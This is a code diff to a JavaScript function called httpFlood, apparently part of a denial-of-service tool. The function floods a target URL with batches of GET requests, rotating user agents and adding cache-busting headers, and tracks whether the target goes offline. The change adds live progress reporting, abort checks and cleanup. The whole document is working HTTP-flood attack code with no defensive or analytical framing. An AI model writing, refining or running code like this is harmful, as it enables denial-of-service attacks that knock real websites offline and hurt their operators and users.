@@ -1,22 +1,16 @@
-async function httpFlood(target, duration, intensity) {
+|
+async function httpFlood(target, duration, intensity, updateStatsCallback) {
   let packetsSent = 0;
   let targetStatus = 'Online';
   let mbps = 0;
   const startTime = Date.now();
+  let timeoutId;
+  let controller = new AbortController();
 
   try {
     const url = new URL(target);
     const host = url.hostname;
-    const path = url.pathname || '/';
-    let port = url.port;
 
-    if (!port) {
-      port = url.protocol === 'https:' ? 443 : 80;
-    } else {
-      port = parseInt(port, 10);
-    }
-
-    const protocol = url.protocol === 'https:' ? 'https' : 'http';
     const interval = Math.max(1, 50 / intensity);
 
     const userAgents = [
@@ -27,29 +21,32 @@ async function httpFlood(target, duration, intensity) {
       'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
     ];
 
-    const controller = new AbortController();
-    const timeoutId = setTimeout(() => {
+    timeoutId = setTimeout(() => {
       controller.abort();
       targetStatus = 'Timeout';
       console.warn("Request timed out");
-    }, 15000); // Set a timeout of 15 seconds
+    }, 15000);
 
     while (Date.now() - startTime < duration * 1000) {
+      if (controller.signal.aborted) break;
+
       const promises = [];
       for (let i = 0; i < intensity; i++) {
+        if (controller.signal.aborted) break;
+
         const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
 
         const promise = fetch(target, {
-            method: 'GET',
-            headers: {
-              'User-Agent': userAgent,
-              'X-Noodles-Bot': 'Active',
-              'Cache-Control': 'no-cache',
-              'Connection': 'keep-alive'
-            },
-            mode: 'no-cors',
-            signal: controller.signal,
-          })
+          method: 'GET',
+          headers: {
+            'User-Agent': userAgent,
+            'X-Noodles-Bot': 'Active',
+            'Cache-Control': 'no-cache',
+            'Connection': 'keep-alive'
+          },
+          mode: 'no-cors',
+          signal: controller.signal,
+        })
           .then(response => {
             packetsSent++;
             if (response.ok) {
@@ -57,6 +54,7 @@ async function httpFlood(target, duration, intensity) {
               if (contentLength) {
                 mbps += parseFloat(contentLength) / 1000000;
               }
+              targetStatus = 'Online';
             } else {
               targetStatus = 'Unresponsive';
               console.warn(`Request failed with status: ${response.status}`);
@@ -67,23 +65,46 @@ async function httpFlood(target, duration, intensity) {
               // Timeout, handled above
             } else {
               targetStatus = 'Offline';
-              console.warn("Request failed:", error); // Log the error for debugging.
+              console.warn("Request failed:", error);
             }
           });
         promises.push(promise);
       }
+
       await Promise.all(promises);
       await new Promise(resolve => setTimeout(resolve, interval));
+
+      // Update stats periodically
+      const elapsedTime = (Date.now() - startTime) / 1000;
+      const currentMbps = (mbps * 8) / elapsedTime;
+
+      if (updateStatsCallback) {
+        updateStatsCallback({
+          packetsSent: packetsSent,
+          targetStatus: targetStatus,
+          mbps: currentMbps.toFixed(2),
+          elapsedTime: elapsedTime.toFixed(2)
+        });
+      }
     }
-
-    clearTimeout(timeoutId);
-
   } catch (error) {
     console.error("Error in httpFlood:", error);
     targetStatus = 'Offline';
+  } finally {
+    clearTimeout(timeoutId);
+    controller.abort();
+    const elapsedTime = (Date.now() - startTime) / 1000;
+    mbps = (mbps * 8) / elapsedTime;
+    if (updateStatsCallback) {
+      updateStatsCallback({
+        packetsSent: packetsSent,
+        targetStatus: targetStatus,
+        mbps: mbps.toFixed(2),
+        elapsedTime: elapsedTime.toFixed(2)
+      });
+    }
+    console.log("HTTP Flood completed.");
   }
-
-  mbps = (mbps * 8) / ((Date.now() - startTime) / 1000);
   return { packetsSent, targetStatus, mbps };
 }
 
